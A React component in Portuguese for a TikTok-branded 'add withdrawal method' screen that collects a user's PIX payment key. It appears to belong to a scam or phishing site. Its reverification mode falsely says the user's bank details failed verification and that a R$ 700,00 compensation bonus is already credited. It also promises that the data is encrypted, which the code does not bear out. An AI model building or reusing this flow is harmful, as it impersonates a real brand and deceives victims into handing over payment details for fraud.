import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ShieldCheck, ChevronRight, DollarSign, AlertCircle } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface BankDetailsScreenProps {
  userName: string;
  onSubmit: (method: string, details: Record<string, string>) => void;
  isReverification?: boolean;
}

const WITHDRAWAL_METHODS = [
  { id: "pix", label: "PIX", subtitle: "Enviar para sua chave PIX", icon: DollarSign },
];

type Step = "method" | "form" | "confirm";

const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: BankDetailsScreenProps) => {
  const [step, setStep] = useState<Step>("method");
  const [selectedMethod, setSelectedMethod] = useState("");
  const [details, setDetails] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);

  const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);

  const updateDetail = (key: string, value: string) =>
    setDetails((prev) => ({ ...prev, [key]: value }));

  const isFormValid = () => {
    if (selectedMethod === "pix") {
      return (details.cashtag?.length ?? 0) > 1;
    }
    return false;
  };

  const handleConfirm = async () => {
    setSubmitting(true);
    await onSubmit(selectedMethod, details);
    setSubmitting(false);
  };

  // --- METHOD SELECTION ---
  if (step === "method") {
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <p className="text-sm text-muted-foreground mb-1">
            Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
          </p>
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Adicionar método de saque</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Etapa 3 de 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-5">
            Escolha como você gostaria de receber seus fundos.
          </p>

          {isReverification && (
            <div className="space-y-3 mb-5">
              <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <div>
                  <p className="text-xs font-semibold text-destructive">Falha na verificação bancária</p>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Seus dados bancários anteriores não puderam ser verificados pelo nosso processador de pagamentos. Isso pode acontecer quando o código do banco não corresponde à conta, ou a conta tem restrições para transferências recebidas.
                  </p>
                </div>
              </div>
              <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
                <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                <div>
                  <p className="text-xs font-semibold">Por que preciso reenviar meus dados?</p>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Para proteger seus fundos, nosso processador de pagamentos exige informações de saque precisas. Por favor, verifique novamente o nome do banco, código e número da conta antes de enviar. Seu bônus de compensação de R$ 700,00 já foi creditado em seu saldo.
                  </p>
                </div>
              </div>
            </div>
          )}

          <div className="rounded-2xl border border-border bg-card overflow-hidden">
            {WITHDRAWAL_METHODS.map((m, i) => {
              const Icon = m.icon;
              return (
                <button
                  key={m.id}
                  onClick={() => { setSelectedMethod(m.id); setStep("form"); }}
                  className={`w-full flex items-center gap-3.5 px-4 py-3.5 text-left hover:bg-accent/50 transition-colors ${
                    i < WITHDRAWAL_METHODS.length - 1 ? "border-b border-border" : ""
                  }`}
                >
                  <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
                    <Icon className="w-5 h-5 text-foreground" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">{m.label}</p>
                    <p className="text-xs text-muted-foreground">{m.subtitle}</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
                </button>
              );
            })}
          </div>
        </div>
      </div>
    );
  }

  // --- CONFIRMATION ---
  if (step === "confirm") {
    const entries = Object.entries(details).filter(([, v]) => v);
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Confirme seus dados</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Etapa 3 de 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-6">
            Revise suas informações de {method?.label} antes de enviar.
          </p>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div>
              <p className="text-xs text-muted-foreground">Método</p>
              <p className="text-sm font-medium">{method?.label}</p>
            </div>
            {entries.map(([key, value]) => (
              <div key={key}>
                <div className="h-px bg-border" />
                <div className="pt-4">
                  <p className="text-xs text-muted-foreground capitalize">{key.replace(/([A-Z])/g, " $1")}</p>
                  <p className="text-sm font-medium">
                    {key === "account"
                      ? value.slice(0, -4).replace(/./g, "•") + value.slice(-4)
                      : value}
                  </p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
            <ShieldCheck className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground">
              Seus dados estão <strong className="text-foreground">criptografados</strong> e protegidos.
            </p>
          </div>

          <Button onClick={handleConfirm} disabled={submitting} className="w-full h-14 rounded-full text-base font-semibold mt-8">
            {submitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
                Processando...
              </span>
            ) : (
              "Confirmar e Continuar"
            )}
          </Button>
          <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
            ← Voltar e editar
          </Button>
        </div>
      </div>
    );
  }

  // --- FORM (per method) ---
  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6">
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Dados do {method?.label}</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Etapa 3 de 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Insira suas informações do {method?.label} para receber seu saque.
        </p>

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança.
          </p>
        </div>

        <div className="space-y-4">
          {selectedMethod === "pix" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">Chave PIX</label>
              <Input
                type="text" placeholder="SuaChavePIX"
                value={details.cashtag || ""}
                onChange={(e) => updateDetail("cashtag", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}
        </div>

        <Button
          onClick={() => setStep("confirm")}
          disabled={!isFormValid()}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Continuar
        </Button>
        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); }} className="w-full mt-3 text-sm text-muted-foreground">
          ← Trocar método
        </Button>
      </div>
    </div>
  );
};

export default BankDetailsScreen;
